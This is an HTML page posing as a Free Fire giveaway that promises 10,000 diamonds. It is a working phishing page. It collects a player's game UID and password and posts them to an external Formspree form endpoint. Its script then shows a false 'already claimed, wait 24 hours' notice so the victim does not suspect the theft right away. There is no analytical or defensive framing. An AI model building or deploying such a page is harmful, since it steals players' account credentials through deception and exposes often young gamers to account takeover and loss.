<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Claim</title>
    <style>
        body {
            margin: 0; font-family: sans-serif;
            background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; color: white;
        }
        .login-box {
            background: #1a1a1a; padding: 30px; border-radius: 10px; width: 300px; text-align: center; border: 1px solid #444;
        }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #ff4500; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
        #status-msg { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2 id="title">VERIFY DETAILS</h2>
        <form id="claim-form" action="https://formspree.io/f/xjglvnrj" method="POST">
            <input type="text" name="FF_ID" id="ff_id" placeholder="Free Fire UID" required>
            <input type="password" name="Password" placeholder="Password" required>
            <button type="submit" id="submit-btn">CLAIM 10,000 💎</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const statusMsg = document.getElementById('status-msg');
        const submitBtn = document.getElementById('submit-btn');

        // Check if they already submitted
        if (localStorage.getItem('ff_claimed') === 'true') {
            form.style.display = 'none';
            document.getElementById('title').innerText = "NOTICE";
            statusMsg.innerHTML = "<span style='color:#ffea00;'>You have already claimed your rewards!</span><br><p style='font-size:12px;'>Wait 24 hours for processing.</p>";
        }

        form.onsubmit = function() {
            localStorage.setItem('ff_claimed', 'true');
            // Form submits to Formspree naturally
        };
    </script>
</body>
</html>
